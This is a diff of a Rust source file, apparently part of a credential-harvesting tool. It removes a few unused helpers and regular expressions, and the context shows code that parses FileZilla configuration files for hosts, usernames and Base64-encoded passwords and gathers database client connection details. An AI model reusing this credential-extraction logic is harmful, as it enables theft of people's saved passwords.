@@ -300,7 +300,6 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
             if let Ok(content) = std::fs::read_to_string(&xml_path) {
                 // FileZilla密码使用Base64编码存储
                 let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
-                let port_re = regex::Regex::new(r"<Port>(\d+)</Port>").ok();
                 let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
                 let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();
 
@@ -689,13 +688,6 @@ fn get_roaming_dir() -> PathBuf {
         .unwrap_or_else(|_| PathBuf::from("."))
 }
 
-fn get_local_appdata() -> PathBuf {
-    std::env::var("LOCALAPPDATA")
-        .map(PathBuf::from)
-        .or_else(|_| std::env::var("APPDATA").map(PathBuf::from))
-        .unwrap_or_else(|_| PathBuf::from("."))
-}
-
 fn extract_username_patterns(content: &str) -> Vec<String> {
     let mut usernames = Vec::new();
     let patterns = [
@@ -722,10 +714,6 @@ fn extract_username_patterns(content: &str) -> Vec<String> {
 }
 
 fn extract_db_connection_info(content: &str, app_name: &str, credentials: &mut Vec<Credential>) {
-    let host_re = regex::Regex::new(r#"host["\s:=]+([^"\s,;]+)"#).ok();
-    let port_re = regex::Regex::new(r#"port["\s:=]+(\d+)"#).ok();
-    let user_re = regex::Regex::new(r#"user(?:name)?["\s:=]+([^"\s,;]+)"#).ok();
-
     for username in extract_username_patterns(content) {
         credentials.push(
             Credential::new(CredType::AppCredential, &format!("{}数据库客户端", app_name))
